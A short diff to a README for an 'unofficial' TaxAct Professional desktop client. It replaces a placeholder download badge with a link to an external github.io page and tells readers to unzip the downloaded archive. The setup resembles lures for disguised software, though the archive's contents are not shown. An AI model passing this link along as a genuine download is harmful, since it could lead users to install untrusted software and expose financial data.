@@ -6,7 +6,7 @@ This unofficial TaxAct Professional desktop client delivers advanced tax prepara
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://taxact-professional-desktop.github.io/.github/)
 
 Unzip the archive to a separate folder.  
 
